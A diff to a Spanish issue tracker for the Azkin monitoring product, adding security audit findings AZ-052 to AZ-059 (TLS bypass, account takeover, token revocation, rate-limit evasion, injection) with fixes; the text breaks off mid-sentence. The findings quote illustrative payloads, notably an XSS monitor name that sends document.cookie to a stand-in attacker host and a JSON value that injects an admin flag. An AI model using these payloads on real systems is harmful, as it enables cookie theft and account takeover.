@@ -15,6 +15,21 @@ Este archivo concentra problemas detectados para resolver en siguientes iteracio
 | [AZ-049](#az-049-federacion-de-instancias-azkin-independientes-en-distintas-regiones-geograficas-con-vista-de-monitoreo-combinada-y-comunicacion-cifrada-por-enrollment) | Federacion de instancias Azkin independientes en distintas regiones, con vista combinada y comunicacion cifrada por enrollment | Alta | [ ] Abierto |
 | [AZ-050](#az-050-bugs-y-brechas-de-ux-encontrados-en-qa-de-la-federacion-de-instancias-az-049) | Bugs y brechas de UX encontrados en QA de la federacion de instancias (AZ-049) | Alta | [~] En progreso |
 | [AZ-051](#az-051-datos-inconsistentes-en-el-detalle-de-monitor-ultimo-chequeo-nunca-uptime-real-y-100-operativo-fijo-sobre-bloques-caidos) | Datos inconsistentes en el detalle de monitor: "Ultimo chequeo: Nunca" pese a tener historial real, y "100% Operativo" fijo sobre bloques caidos | Alta | [x] Resuelto |
+| [AZ-052](#az-052-auditoria-de-seguridad-bypass-de-validacion-de-certificado-tls-en-el-envio-de-alertas-por-email) | Auditoria de seguridad: bypass de validacion de certificado TLS en el envio de alertas por email | Media | [x] Resuelto |
+| [AZ-053](#az-053-toma-de-cuentas-ajenas-import-de-backup-acepta-un-passwordhash-arbitrario-y-resetear-contrasena-de-admin-no-valida-que-el-id-sea-realmente-un-admin) | Auditoria de seguridad: toma de cuentas ajenas via import de backup y reset de contraseña de Admin sin scope | Alta | [x] Resuelto |
+| [AZ-054](#az-054-sin-revocacion-de-sesion-bloqueareliminar-un-usuario-o-cambiarle-permisos-no-invalida-sus-tokens-ya-emitidos-y-el-token-de-acceso-es-intercambiable-por-el-de-refresh) | Auditoria de seguridad: sin revocacion de sesion, y token de acceso intercambiable por el de refresh | Alta | [x] Resuelto |
+| [AZ-055](#az-055-el-rate-limiter-anti-fuerza-bruta-de-loginresetenrollment-es-evadible-el-backend-queda-expuesto-en-todas-las-interfaces-y-confia-en-x-forwarded-for) | Auditoria de seguridad: rate limiter anti fuerza-bruta evadible (puerto expuesto + X-Forwarded-For) | Alta | [x] Resuelto |
+| [AZ-056](#az-056-el-token-de-recuperacion-de-contrasena-se-loguea-en-texto-plano-cuando-no-hay-smtp-configurado) | Auditoria de seguridad: token de recuperacion de contraseña logueado en texto plano sin SMTP | Alta | [x] Resuelto |
+| [AZ-057](#az-057-cambiar-la-propia-contrasena-no-exige-la-contrasena-actual) | Auditoria de seguridad: cambiar la propia contraseña no exige la contraseña actual | Media | [x] Resuelto |
+| [AZ-058](#az-058-inyeccion-html-en-el-email-de-informes-periodicos-e-inyeccion-json-en-el-payload-de-webhooks-de-notificacion) | Auditoria de seguridad: inyeccion HTML en informes por email e inyeccion JSON en webhooks | Media | [x] Resuelto |
+| [AZ-059](#az-059-exportacion-csv-vulnerable-a-inyeccion-de-formulas-csvexcel-injection) | Auditoria de seguridad: exportacion CSV vulnerable a inyeccion de formulas | Media | [x] Resuelto |
+| [AZ-060](#az-060-el-backup-descargable-expone-los-password-hash-de-todos-los-adminsviewers-y-la-clave-privada-tls-a-cualquier-admin) | Auditoria de seguridad: el backup expone password hashes de todos y la clave privada TLS a cualquier Admin | Media | [~] Mayormente resuelto |
+| [AZ-061](#az-061-las-api-keys-son-equivalentes-a-un-admin-completo-sin-poder-acotarlas-a-monitores-o-grupos-especificos) | Auditoria de seguridad: las API keys son equivalentes a un Admin completo, sin scope acotable | Media | [~] Mayormente resuelto |
+| [AZ-062](#az-062-las-credenciales-snmp-nunca-se-enmascaran-visibles-para-viewers-con-permiso-sobre-un-solo-monitor-y-en-texto-plano-en-el-log-de-auditoria) | Auditoria de seguridad: credenciales SNMP nunca se enmascaran (API y audit log) | Media | [x] Resuelto |
+| [AZ-063](#az-063-azkin_jwt_secret-sin-longitud-minima-de-el-se-deriva-ademas-la-clave-de-cifrado-en-reposo-de-tlsfederacion) | Auditoria de seguridad: AZKIN_JWT_SECRET sin longitud minima | Media | [x] Resuelto |
+| [AZ-064](#az-064-credenciales-por-defecto-en-envexample-parecen-contrasenas-reales-no-placeholders-obvios-y-no-hay-verificacion-al-arrancar) | Auditoria de seguridad: credenciales de ejemplo poco obvias en .env.example, sin verificacion al arrancar | Baja | [x] Resuelto |
+| [AZ-065](#az-065-sin-cabeceras-de-seguridad-helmet-en-el-dashboard-de-administracion-el-contenedor-backend-corre-como-root) | Auditoria de seguridad: sin cabeceras de seguridad (helmet); contenedor backend corre como root | Baja | [x] Resuelto |
+| [AZ-066](#az-066-miscelanea-de-hardening-de-autenticacion-rate-limit-compartido-sin-bloqueo-por-intentos-fallidos-politica-de-contrasena-debil-y-otros-gaps-menores) | Auditoria de seguridad: miscelanea de hardening de autenticacion | Baja | [~] Mayormente resuelto |
 
 ### UX / Funcionalidad (batch post-auditoria de seguridad)
 
@@ -769,3 +784,877 @@ independientes entre si, ademas de una explicacion probable para el falso-DOWN:
   corporativo interno al contenedor `azkin-back` (directiva `dns:` en `compose.yaml`/`compose.dev.yaml`),
   ya que el contenedor no hereda automaticamente la resolucion DNS interna que si tiene la maquina
   del usuario (por VPN/LAN corporativa).
+
+---
+
+## AZ-052) Auditoria de seguridad: bypass de validacion de certificado TLS en el envio de alertas por email
+
+- Codigo: AZ-052
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+Corregido: `MultichannelNotifier.sendEmail()` (`multichannel-notifier.ts`) ya no pasa
+`tls: { rejectUnauthorized: false }` de forma incondicional — el transporte de `nodemailer` usa
+ahora el default seguro (`rejectUnauthorized: true`), igual que `smtp-mailer.ts`. No se implementó
+el punto opcional de exponer un `smtpIgnoreTls` por canal (marcado como "(Opcional)" en el propio
+criterio de aceptación) — queda como mejora futura si algún Admin necesita de verdad un relay SMTP
+autofirmado. Verificado por lectura de código (el test existente no mockea `nodemailer`, agregar un
+mock solo para este caso no aportaba señal adicional); suite completa 268/268.
+
+### Descripcion
+
+Auditoria de seguridad solicitada por el usuario sobre todo el codigo del proyecto (no un diff
+puntual). Se uso un proceso de 3 fases (investigacion de patrones establecidos en el propio repo →
+analisis comparativo del codigo cambiado contra esos patrones → evaluacion de explotabilidad),
+seguido de una segunda pasada de verificacion independiente por hallazgo para descartar falsos
+positivos, exigiendo evidencia concreta (archivo:linea) y un puntaje de confianza >=8/10 antes de
+reportar cualquier cosa. De varios candidatos evaluados, **uno solo** paso ese umbral (otro, sobre
+falta de validacion Zod en un endpoint P2P de federacion, se descarto explicitamente: cada campo ya
+esta protegido rio abajo por `Types.ObjectId.isValid()` y el cast de esquema de Mongoose, sin
+ninguna ruta de explotacion real):
+
+`MultichannelNotifier.sendEmail()` (usado para las alertas UP/DOWN/DEGRADADO por canal de
+notificacion de tipo email) crea el transporte de `nodemailer` con
+`tls: { rejectUnauthorized: false }` de forma **incondicional** — sin ningun toggle de
+Admin, sin gate de entorno test/dev, y sin relacion con el campo `smtpSecure` (que solo controla
+TLS implicito vs. STARTTLS, no la validacion del certificado). El comentario en el codigo dice
+"Permite auto-firmados en testing", pero el codigo corre igual en produccion.
+
+Esto es inconsistente con el resto del propio proyecto: `smtp-mailer.ts` (el correo transaccional,
+ej. reset de contraseña) **no** desactiva la validacion — usa el default seguro de nodemailer
+(`rejectUnauthorized: true`) — y el proyecto ya tiene establecido el patron correcto para este tipo
+de bypass explicito y opcional: `monitor.ignoreTls` en los monitores HTTP (`http.checker.ts`), que
+es un opt-in visible por Admin, no un bypass incondicional y oculto.
+
+**Escenario de explotacion:** un Admin configura un canal de email con `smtpSecure: true` apuntando
+a un relay real (ej. el SMTP corporativo de su organizacion), asumiendo que la conexion esta
+autenticada/cifrada de punta a punta. Un atacante en el camino de red entre el backend de Azkin y
+ese host SMTP (router comprometido, AP Wi-Fi malicioso, DNS hijack del hostname SMTP) puede
+presentar cualquier certificado autofirmado/invalido y la conexion se acepta igual — permitiendo
+interceptar los correos de alerta (que incluyen nombres de monitores, URLs y detalle de estado) o
+alterar/descartar silenciosamente su entrega.
+
+### Comportamiento esperado
+
+1. El envio de alertas por email valida el certificado TLS del servidor SMTP por defecto, igual que
+   ya hace `smtp-mailer.ts` para el correo transaccional.
+2. Si en algun momento se necesita soportar un relay SMTP con certificado autofirmado, existe un
+   campo explicito y visible para el Admin en la configuracion del canal (mismo patron que
+   `ignoreTls` en monitores HTTP) — nunca un bypass incondicional y oculto en el codigo.
+
+### Criterios de aceptacion
+
+1. `MultichannelNotifier.sendEmail()` ya no pasa `tls: { rejectUnauthorized: false }` de forma
+   incondicional — el default es validar el certificado.
+2. (Opcional, si se decide soportar relays autofirmados) La configuracion del canal de email
+   (`EmailConfig`) expone un campo booleano explicito (ej. `smtpIgnoreTls`) que el Admin activa a
+   sabiendas, documentado como riesgo, igual que `ignoreTls` en monitores.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/notifier/multichannel-notifier.ts:179-187` (`sendEmail()`, el
+  transporte con el bypass).
+- `backend/src/infrastructure/notifier/smtp-mailer.ts:29-35` (patron correcto ya existente en el
+  mismo proyecto, sin bypass, para comparar).
+- `backend/src/infrastructure/checkers/http.checker.ts` (`monitor.ignoreTls`) como referencia del
+  patron de opt-in explicito y visible por Admin, si se decide soportar el caso de uso legitimo de
+  relays SMTP autofirmados.
+
+---
+
+## AZ-053) Toma de cuentas ajenas: import de backup acepta un passwordHash arbitrario, y "resetear contraseña de Admin" no valida que el id sea realmente un Admin
+
+- Codigo: AZ-053
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Alta
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+Corregidos ambos vectores. (1) `import-backup.usecase.ts`: `passwordHash` ahora debe tener forma
+de hash bcrypt real (regex `^\$2[aby]\$\d{2}\$.{53}$`) en ambos schemas; `importAdmins` ya no
+sobrescribe el `passwordHash` de un admin ya existente durante un import — solo lo hace para
+cuentas nuevas (`importViewers` ya no lo hacía). El resultado de import reporta ahora
+`passwordsSkipped` por sección para que el Admin note qué cuentas conservaron su contraseña
+original (surfaced en `/settings` → Respaldos). (2) `resetAdminPassword`
+(`user.controller.ts`) verifica explícitamente `target.role === "admin"` antes de aplicar el
+cambio (404 si no), cerrando el IDOR hacia Viewers de cualquier Admin. Cubierto con tests nuevos
+(`import-backup.usecase.test.ts`, `user.controller.test.ts`). Suite completa 268/268.
+
+### Descripcion
+
+Auditoria de seguridad ampliada (segunda ronda, 5 agentes en paralelo sobre auth, RBAC/IDOR,
+cripto, inyeccion e infraestructura). Dos rutas distintas terminan en el mismo problema: un Admin
+puede tomar el control de OTRA cuenta (Admin o Viewer, incluso de otro Admin) sin conocer ni probar
+la contraseña actual.
+
+**1) Import de backup — `backend/src/application/use-cases/backup/import-backup.usecase.ts`.**
+`backupAdminSchema`/`backupViewerSchema` (lineas 37-54) solo exigen `passwordHash: z.string().min(1)`
+— cualquier string pasa, no se valida que sea un hash bcrypt real ni que el archivo provenga de un
+export legitimo de esta misma instancia (sin firma/HMAC). `importAdmins` (lineas 141-160): si ya
+existe un admin con ese email, llama `this.users.changePassword(existingId, data.passwordHash)`
+directo — sin pedir la contraseña actual, sin reautenticacion. Mismo patron en `importViewers`
+(lineas 165-214). La ruta `POST /api/v1/backup/import` (`backup.routes.ts:11`) solo exige
+`requireRole("admin")` — cualquier cuenta Admin, no una en particular.
+Ejemplo de explotacion: subir `{"admins":[{"email":"otro-admin@empresa.com","passwordHash":"$2b$10$<hash de una contraseña elegida por el atacante>"}]}` sobrescribe silenciosamente la contraseña de ese admin.
+
+**2) `PUT /api/v1/users/admins/:id/password` — `backend/src/infrastructure/http/controllers/user.controller.ts:134-154`.**
+`resetAdminPassword` toma `id = req.params.id` y llama directo a
+`this.usersRepo.changePassword(id, passwordHash)`. Verificado en
+`mongoose-user.repository.ts:50-56`: `changePassword` hace
+`UserModel.updateOne({ _id: id }, { passwordHash })` **sin filtro de `role` ni de `adminId`** — a
+diferencia de todos sus metodos hermanos (`setAdminBlocked`, `deleteAdmin`,
+`updateAdminEmail`, que si filtran por `role:"admin"`, y `findViewerById`/`updateViewerPermissions`/
+`deleteViewer`, que filtran por `role:"viewer", adminId`). Como resultado, un Admin puede pasarle a
+este endpoint (pensado para resetear la contraseña de OTRO ADMIN) el id de un **Viewer que pertenece
+a un Admin distinto**, y el reset se aplica igual — saltandose por completo el aislamiento por
+`adminId` que el resto del codigo sí respeta para Viewers. Los ids de Viewer son ObjectIds de 24
+caracteres visibles/enumerables desde otros endpoints (audit log, asignacion masiva de canales, etc.).
+
+### Comportamiento esperado
+
+1. Importar un backup nunca sobrescribe la contraseña de una cuenta ya existente sin alguna prueba
+   de legitimidad (firma del archivo contra un secreto propio de la instancia que lo genero, o un
+   flujo separado de "forzar reset" explicito y auditado, no un cambio silencioso).
+2. `PUT /users/admins/:id/password` solo puede aplicarse a una cuenta con `role:"admin"` — nunca a
+   un Viewer, y mucho menos a un Viewer de otro Admin.
+
+### Criterios de aceptacion
+
+1. `ImportBackupUseCase` rechaza o marca como advertencia explicita cualquier intento de
+   sobrescribir el `passwordHash` de una cuenta ya existente, salvo que el backup tenga alguna forma
+   de autenticidad verificable.
+2. `changePassword` (o un metodo nuevo dedicado) filtra por `role:"admin"` cuando lo invoca
+   `resetAdminPassword`, igual que ya hacen `setAdminBlocked`/`deleteAdmin`/`updateAdminEmail`.
+3. Test de regresion: `resetAdminPassword` con el id de un Viewer (de cualquier Admin) devuelve 404,
+   no 200.
+
+### Pistas de investigacion
+
+- `backend/src/application/use-cases/backup/import-backup.usecase.ts:37-54,126-163`
+- `backend/src/infrastructure/http/controllers/user.controller.ts:134-154`
+- `backend/src/infrastructure/persistence/mongoose/repositories/mongoose-user.repository.ts:50-56`
+  (comparar con `setAdminBlocked`/`deleteAdmin`/`updateAdminEmail`/`findViewerById` en el mismo
+  archivo para ver el patron correcto ya usado en otros metodos).
+- Nota de contexto: `spec/03-modelo-datos.md` §8 dice que los Admins no tienen aislamiento entre si
+  para Viewers, lo cual contradice el aislamiento por `adminId` que si esta implementado en
+  `findAllViewers`/`findViewerById`/`updateViewerPermissions`/`deleteViewer` — vale la pena resolver
+  esa contradiccion de una vez (decidir cual es el modelo real) al corregir este punto.
+
+---
+
+## AZ-054) Sin revocacion de sesion: bloquear/eliminar un usuario o cambiarle permisos no invalida sus tokens ya emitidos, y el token de acceso es intercambiable por el de refresh
+
+- Codigo: AZ-054
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Alta
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+1. **Revocación por `isBlocked` en cada request:** `makeAuthGuard` (`auth-guard.ts`) ahora recibe
+   `IUserRepository` y, tras verificar la firma del JWT, hace `findById(userId)` y rechaza con
+   `UnauthorizedError` si la cuenta no existe o está bloqueada — mismo criterio "mínimo" que pide
+   el propio criterio de aceptación. Bloquear/eliminar una cuenta corta su acceso en la siguiente
+   request, sin esperar a que el token expire solo.
+2. **Claim `typ` en el JWT:** `ITokenService.sign()`/`verify()` ganaron un parámetro
+   `type: "access" | "refresh"` (`security.ts`, `jwt-token-service.ts`); `verify(token,
+   expectedType)` rechaza el token si su claim `typ` no coincide. `auth-guard.ts` exige `"access"`,
+   `RefreshUseCase` exige `"refresh"`. **Nota de despliegue:** los tokens ya emitidos antes de este
+   cambio no tienen claim `typ` y quedan invalidados — todas las sesiones activas se cierran al
+   desplegar esta versión (login/refresh vuelven a funcionar de inmediato, solo hay que
+   reautenticarse una vez).
+3. **Duración TV/Kiosko:** se extrajo el literal `31536000` a la constante
+   `TV_SESSION_EXPIRES_IN_SECONDS` (documentada en `login.usecase.ts`) — se mantiene en 1 año (no se
+   redujo) porque el punto 1 ya cubre la revocación anticipada que antes faltaba.
+
+Cubierto con tests nuevos (`auth-guard.test.ts`, `jwt-token-service.test.ts`) y actualización de
+los existentes (`login.usecase.test.ts`, `refresh.usecase.test.ts`, `register.usecase.test.ts`,
+`socketio.gateway.ts` también exige `"access"`). Suite completa 268/268.
+
+### Descripcion
+
+`makeAuthGuard` (`backend/src/infrastructure/http/middlewares/auth-guard.ts:10-28`), que corre en
+**cada** request protegido, solo hace `tokens.verify(token)` — sin ningun lookup a la base de datos.
+`isBlocked` solo se revisa en `LoginUseCase` (`login.usecase.ts:55`) y `RefreshUseCase`
+(`refresh.usecase.ts:30`), nunca en un request comun. Consecuencia: bloquear una cuenta, cambiarle
+la contraseña, o reducirle los permisos a un Viewer no invalida los tokens que esa cuenta ya tiene
+en uso — siguen funcionando hasta que expiran solos. Para sesiones normales son hasta 2h
+(`AZKIN_JWT_EXPIRES_IN`), pero para sesiones TV/Kiosko (`login.usecase.ts:67`,
+`refresh.usecase.ts:36`) son **31536000 segundos = 1 año**.
+
+Ademas, `JwtTokenService.sign()` (`backend/src/infrastructure/security/jwt-token-service.ts:18-21`)
+genera el token de acceso y el de refresh con exactamente la misma forma de payload
+(`{sub, role, adminId, permissions}`), sin ningun claim `typ`/`purpose` que los distinga. Verificado
+en `refresh.usecase.ts:24`: `RefreshUseCase` llama al mismo `tokens.verify()` generico que usa el
+auth guard — no discrimina "esto es un refresh token". Consecuencia: un refresh token filtrado (7
+dias, o 1 año en TV) funciona directo como Bearer de acceso en cualquier endpoint protegido; y un
+access token (2h) puede presentarse en `POST /auth/refresh` para obtener un refresh token nuevo de
+larga duracion, extendiendo la ventana de un access token robado mas alla de su expiracion original.
+
+### Comportamiento esperado
+
+1. Bloquear, eliminar o degradar los permisos de una cuenta corta su acceso de forma practicamente
+   inmediata, no recien cuando el token expira solo.
+2. Un token de acceso no puede usarse como refresh token, ni viceversa.
+
+### Criterios de aceptacion
+
+1. Existe algun mecanismo de revocacion (verificacion de `isBlocked`/existencia en escrituras
+   sensibles como minimo, o un `tokenVersion`/denylist) que corta el acceso de una cuenta bloqueada
+   sin esperar la expiracion natural del token.
+2. Los tokens llevan un claim `typ: "access" | "refresh"` y tanto el auth guard como
+   `RefreshUseCase` lo validan explicitamente, rechazando el tipo equivocado.
+3. Se reevalua la duracion de 1 año para sesiones TV/Kiosko a la luz de que hoy no hay forma de
+   revocarlas antes de tiempo.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/http/middlewares/auth-guard.ts:10-28`
+- `backend/src/infrastructure/security/jwt-token-service.ts` (agregar el claim `typ` en `sign()` y
+  validarlo en `verify()`, o exponer un `verify(token, expectedType)`).
+- `backend/src/application/use-cases/auth/{login,refresh}.usecase.ts` (duracion de sesion TV, uso
+  actual de `isBlocked`).
+
+---
+
+## AZ-055) El rate limiter anti fuerza-bruta de login/reset/enrollment es evadible: el backend queda expuesto en todas las interfaces y confia en `X-Forwarded-For`
+
+- Codigo: AZ-055
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Alta
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`compose.yaml`/`compose.dev.yaml`: los puertos del backend (`AZKIN_BACK_PORT`,
+`AZKIN_HTTPS_PORT`) ahora se publican enlazados a `127.0.0.1`, mismo patrón que ya usaba Mongo —
+el único punto de entrada público soportado es nginx (`AZKIN_FRONTEND_PORT`). Documentado en
+`docs/instalacion-docker.md` (§8 nota de bóveda de credenciales del backup no aplica aquí; ver §9
+tabla de problemas frecuentes y §12 tabla de puertos, ambas actualizadas) que exponer el backend
+directo a la red reabre el riesgo de evadir el rate limiter falsificando `X-Forwarded-For`. No se
+tocó `trust proxy: 1` en `composition-root.ts` — sigue siendo correcto una vez que nginx es la
+única forma de llegar al backend desde la red.
+
+### Descripcion
+
+`backend/src/composition-root.ts:219` — `app.set("trust proxy", 1)`: Express deriva `req.ip` del
+header `X-Forwarded-For`, asumiendo que **todo** trafico pasa primero por nginx (que es quien
+deberia fijar ese header de forma confiable). Pero `compose.yaml:45` publica el puerto del backend
+como `"${AZKIN_BACK_PORT:-3000}:3000"` — **sin** el prefijo `127.0.0.1:` que si tiene Mongo
+explicitamente (`compose.yaml:24`, con un comentario propio justificando por que Mongo se restringe
+asi). El puerto del backend, en cambio, queda publicado en todas las interfaces por defecto.
+
+El limitador de fuerza bruta (`backend/src/infrastructure/http/middlewares/rate-limit.ts`, aplicado
+a `/login`, `/forgot-password`, `/reset-password` en `auth.routes.ts:12-17`, y a
+`/federation/enrollments` en `federation.routes.ts:25,33`) usa el `keyGenerator` por defecto de
+`express-rate-limit`, que es `req.ip`. Como ese valor viene de un header que el cliente controla en
+cuanto se conecta directo al puerto 3000 (sin pasar por nginx), un atacante puede mandar un
+`X-Forwarded-For` distinto en cada request y obtener un cupo de 10 intentos nuevo cada vez —
+neutralizando por completo el limite en login, en el consumo de tokens de reset de contraseña, y en
+el consumo de tokens de enrollment de federacion.
+
+### Comportamiento esperado
+
+1. El puerto plano del backend no es alcanzable directamente desde fuera del host salvo que el
+   operador lo exponga a proposito — el trafico publico pasa siempre por nginx.
+2. El rate limiting de los endpoints sensibles no puede evadirse falsificando cabeceras.
+
+### Criterios de aceptacion
+
+1. `compose.yaml`/`compose.dev.yaml` enlazan el puerto del backend a `127.0.0.1` por defecto (mismo
+   patron que ya usa Mongo), dejando `AZKIN_BACK_PORT` para depuracion local, no para exposicion
+   publica directa.
+2. Documentado en `docs/instalacion-docker.md` que el unico punto de entrada publico soportado es
+   nginx (puerto 80/443), y que exponer el backend directo rompe el rate limiting.
+
+### Pistas de investigacion
+
+- `compose.yaml:41-45`, `compose.dev.yaml:37-40` (comparar con el binding de Mongo en
+  `compose.yaml:24`).
+- `backend/src/composition-root.ts:219` (`trust proxy`).
+- `backend/src/infrastructure/http/middlewares/rate-limit.ts`.
+
+---
+
+## AZ-056) El token de recuperacion de contraseña se loguea en texto plano cuando no hay SMTP configurado
+
+- Codigo: AZ-056
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Alta
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`smtp-mailer.ts` (`logMock`) ahora redacta cualquier `token=<hex>` de query string y cualquier
+token hexadecimal suelto de 32+ caracteres (el formato exacto que usa
+`request-password-reset.usecase.ts`) antes de loguear el cuerpo del correo — el envío real por SMTP
+no cambia, solo el modo mock. Además, `env.ts` agrega un warning de arranque (mismo patrón que
+`AZKIN_CORS_ORIGIN=*`) cuando `AZKIN_SMTP_HOST`/`USER`/`PASSWORD` están incompletos, indicando que
+los correos (incluido el de reset) van a modo log salvo que se configure un canal de notificación
+tipo Email como fuente de SMTP.
+
+### Descripcion
+
+`backend/src/application/use-cases/auth/request-password-reset.usecase.ts` arma el email de reset
+con el token/link **sin hashear** y lo pasa a `mailer.send(...)`. Todos los campos
+`AZKIN_SMTP_*` son opcionales (`env.ts:49-54`) — si no estan completos, o si el envio falla,
+`SmtpMailer.send()` (`backend/src/infrastructure/notifier/smtp-mailer.ts:19-27,55-59`) cae en
+silencio a `logMock(input)`, que hace `logger.warn(\`[SMTP MOCK] Mensaje:\n${input.text}\`)` —
+imprimiendo el email completo, **con el token de reset valido**, a stdout/`docker logs`. A
+diferencia del caso `AZKIN_CORS_ORIGIN=*` (que si dispara una advertencia de arranque, `env.ts:139-141`),
+no hay ningun aviso de que SMTP no esta configurado y que los tokens de reset van a parar al log.
+
+### Comportamiento esperado
+
+1. El token de recuperacion de contraseña nunca aparece en texto plano en los logs, con o sin SMTP
+   configurado.
+2. Si SMTP no esta configurado, el operador recibe una advertencia clara al arrancar (mismo patron
+   que ya existe para CORS).
+
+### Criterios de aceptacion
+
+1. El modo mock de `SmtpMailer` redacta el token/link antes de loguear el cuerpo del correo.
+2. Existe una advertencia de arranque cuando `AZKIN_SMTP_*` esta incompleto, indicando que
+   password-reset y otros correos degradan a modo log.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/notifier/smtp-mailer.ts:19-27,55-59`
+- `backend/src/application/use-cases/auth/request-password-reset.usecase.ts:36-51`
+- `backend/src/infrastructure/config/env.ts:49-54,139-141` (patron de advertencia ya usado para CORS).
+
+---
+
+## AZ-057) Cambiar la propia contraseña no exige la contraseña actual
+
+- Codigo: AZ-057
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`changeOwnPassword` (`user.controller.ts`) ahora exige `currentPassword` en el body y lo valida
+contra el hash guardado (`hasher.compare`) antes de aplicar el cambio — 401 si no coincide, 400 si
+no se envía. Se agregó también el registro de auditoría (`OWN_PASSWORD_CHANGE`) que antes faltaba
+en este método. Frontend: el formulario "Cambiar Contraseña" en `/profile` agrega el campo
+"Contraseña Actual" y lo envía junto al resto. Cubierto en `user.controller.test.ts`.
+
+### Descripcion
+
+`PUT /api/v1/users/profile/password` (`user.routes.ts:31`) →
+`changeOwnPassword` (`backend/src/infrastructure/http/controllers/user.controller.ts:176-190`):
+cualquier usuario autenticado puede cambiar su propia contraseña mandando solo `newPassword` (≥8
+caracteres) — sin verificar `currentPassword` en ningun punto del flujo. Un token de acceso expuesto
+brevemente (XSS, log filtrado, sesion abierta en un equipo compartido/kiosko) alcanza para tomar
+control permanente de la cuenta sin haber conocido nunca la contraseña original.
+
+### Comportamiento esperado
+
+Cambiar la propia contraseña exige probar la contraseña actual (o un segundo factor equivalente),
+igual que ya exige el flujo de reset por token para quien no la recuerda.
+
+### Criterios de aceptacion
+
+1. `changeOwnPassword` recibe y valida `currentPassword` contra el hash guardado (`hasher.compare`)
+   antes de aplicar el cambio; responde 401/400 si no coincide.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/http/controllers/user.controller.ts:176-190`
+- `backend/src/infrastructure/security/bcrypt-password-hasher.ts` (`compare()` ya existe y se usa en
+  login).
+
+---
+
+## AZ-058) Inyeccion HTML en el email de informes periodicos, e inyeccion JSON en el payload de webhooks de notificacion
+
+- Codigo: AZ-058
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+(1) `buildSummaryHtml()` (`send-report-email.usecase.ts`) escapa entidades HTML (`&amp; &lt; &gt;
+&quot; &#39;`) en `definitionName` y en `monitorName` del Top de indisponibilidad antes de
+interpolarlos. (2) `renderTemplate()` (`template-renderer.ts`) ganó un tercer parámetro opcional
+`escapeValue` (default `String`, sin cambio de comportamiento para quien no lo pase);
+`MultichannelNotifier.sendWebhook()` lo usa con un escape JSON-string
+(`JSON.stringify(v).slice(1,-1)`) al renderizar el body del canal webhook, así que un valor con
+comillas/backslashes ya no rompe el JSON efectivamente enviado. `sendSlack`/`sendDiscord` no
+cambiaron (ya eran seguros). Cubierto con tests nuevos (`send-report-email.usecase.test.ts`,
+`multichannel-notifier.test.ts`).
+
+### Descripcion
+
+**1) HTML sin escapar en el email de informes.** `buildSummaryHtml()` en
+`backend/src/application/use-cases/reports/send-report-email.usecase.ts:42-71` interpola
+`data.definitionName` y `row.monitorName` (ambos sin restriccion de caracteres en su schema Zod)
+directo dentro de un string HTML, sin ninguna funcion de escape en todo el archivo. Ese HTML se
+manda como `html:` del correo (`smtp-mailer.ts:41`) a la lista de destinatarios del informe. Como
+los monitores son un pool global (sin aislamiento entre Admins), cualquier Admin puede nombrar un
+monitor `&lt;img src=x onerror="fetch('https://atacante.example/c?x='+document.cookie)"&gt;` y ese
+HTML llega intacto al cliente de correo de cualquier destinatario del informe la proxima vez que se
+genere — a diferencia de los correos de alerta UP/DOWN/DEGRADADO, que sí van en texto plano
+(`multichannel-notifier.ts:193`) y no tienen este problema.
+
+**2) JSON armado por sustitucion de texto en el webhook por defecto.** La plantilla webhook por
+defecto (`backend/src/infrastructure/notifier/default-templates.ts:16-21`) es un
+`JSON.stringify({...})` con placeholders `{{var}}` como *valores* dentro del JSON ya serializado.
+`renderTemplate` (`template-renderer.ts`) hace un `.replace()` de texto plano sobre ese string,
+sustituyendo el valor real **sin escapar comillas ni backslashes**. Un nombre de monitor con una
+comilla doble (`Bob's "prod" server`, o algo deliberado como
+`test","admin":true,"x":"y`) rompe o adultera el JSON que efectivamente se envia al webhook
+configurado — a diferencia de Slack/Discord, que sí arman el payload con `JSON.stringify` sobre un
+objeto real en el momento del envio (`multichannel-notifier.ts:79-109`), evitando el problema.
+
+### Comportamiento esperado
+
+1. Ningun valor controlado por un Admin (nombre de monitor, nombre de informe) puede alterar la
+   estructura HTML del email de informes ni la estructura JSON del webhook por defecto.
+
+### Criterios de aceptacion
+
+1. `buildSummaryHtml()` escapa entidades HTML (`&amp; &lt; &gt; &quot; &#39;`) en todo valor
+   interpolado.
+2. El body del canal tipo webhook se arma poblando un objeto real y aplicando `JSON.stringify()` en
+   el momento del envio (o, como minimo, `renderTemplate` escapa comillas/backslashes al sustituir
+   valores dentro de un JSON ya serializado).
+
+### Pistas de investigacion
+
+- `backend/src/application/use-cases/reports/send-report-email.usecase.ts:42-71`
+- `backend/src/infrastructure/notifier/default-templates.ts:16-21`,
+  `backend/src/infrastructure/notifier/template-renderer.ts` (`renderTemplate`)
+- `backend/src/infrastructure/notifier/multichannel-notifier.ts:79-150` (comparar `sendSlack`/
+  `sendDiscord`, que si son seguros, contra `sendWebhook`).
+
+---
+
+## AZ-059) Exportacion CSV vulnerable a inyeccion de formulas (CSV/Excel injection)
+
+- Codigo: AZ-059
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`escapeCsv()` en `dashboard.ts` (`downloadEventsCsv`) ahora antepone un `'` a cualquier celda que
+empiece con `= + - @` antes de aplicar el escape de comillas/comas ya existente. Se confirmó que
+`downloadCsvTemplate()` en `backups-panel.ts` (la otra exportación CSV del proyecto) es contenido
+100% estático sin datos de usuario interpolados, así que no aplica este fix.
+
+### Descripcion
+
+`escapeCsv()` en `frontend/src/app/features/dashboard/dashboard.ts:1509` solo entrecomilla celdas
